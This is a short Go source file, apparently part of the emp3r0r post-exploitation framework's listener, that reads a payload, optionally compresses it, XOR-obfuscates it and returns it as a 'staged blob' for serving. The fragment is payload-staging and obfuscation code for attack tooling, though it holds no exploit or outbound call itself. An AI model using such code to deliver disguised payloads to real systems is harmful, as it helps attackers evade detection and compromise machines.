package listener

import (
	"fmt"

	"github.com/jm33-m0/emp3r0r/core/lib/logging"
	"github.com/jm33-m0/emp3r0r/core/lib/util"
)

func xorData(data, key []byte) {
	if len(key) == 0 {
		return
	}
	for i := range data {
		data[i] ^= key[i%len(key)]
	}
}

func buildServedBlob(payloadPath, keyStr string, compression bool) ([]byte, error) {
	// ReadFileAgent handles both mem:// and disk paths
	payload, err := util.ReadFileAgent(payloadPath)
	if err != nil {
		return nil, fmt.Errorf("failed to read payload: %v", err)
	}

	key := deriveKeyFromString(keyStr)
	var toServe []byte
	if compression {
		toServe = compressData(payload)
	} else {
		toServe = payload
	}

	blob := make([]byte, 0, len(toServe))
	blob = append(blob, toServe...)
	xorData(blob, key)
	logging.Infof("Serving staged blob: payload=%d bytes", len(blob))
	return blob, nil
}
